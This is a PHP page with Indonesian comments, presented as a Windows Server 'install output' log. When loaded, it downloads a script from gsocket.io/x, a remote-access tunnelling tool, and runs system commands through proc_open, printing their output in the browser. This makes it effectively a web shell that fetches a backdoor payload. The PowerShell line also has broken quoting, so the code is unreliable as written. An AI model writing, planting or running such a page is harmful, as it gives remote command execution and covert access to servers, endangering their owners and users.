<?php
// Pastikan script ini dijalankan dengan hak akses Administrator di Windows Server
// Peringatan keamanan: Batasi akses ke file PHP ini agar tidak bisa dieksekusi sembarang orang di web.

// Tentukan perintah yang ingin dijalankan di Windows Server
// Contoh menggunakan PowerShell untuk mengunduh atau menjalankan perintah setup
$command = 'powershell -Command "Invoke-WebRequest -Uri \'https://gsocket.io/x\' -OutFile \ C:\temp\gsocket_install.ps1\'" 2>&1';

// Eksekusi tahap awal download (atau Anda bisa menyesuaikan dengan perintah sistem lain)
$output_download = shell_exec($command);

// Jika Anda ingin menjalankan perintah secara langsung dan menangkap real-time/full output:
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

// Contoh menjalankan perintah command line di Windows dan menangkap outputnya
$cmd_to_run = 'ipconfig'; // Ganti dengan perintah instalasi yang diinginkan di Windows
$process = proc_open($cmd_to_run, $descriptorspec, $pipes);

$output = "";
if (is_resource($process)) {
    // Membaca standard output dari proses
    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // Membaca standard error jika ada
    $error = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    // Menutup proses
    $return_value = proc_close($process);
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Install Output - Windows Server</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
        pre { background: #2d2d2d; padding: 15px; border: 1px solid #444; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <h2>Log Output Instalasi / Eksekusi Sistem:</h2>
    <pre><?php 
        echo htmlspecialchars($output); 
        if (!empty($error)) {
            echo "\n[ERROR]:\n" . htmlspecialchars($error);
        }
    ?></pre>
</body>
</html>
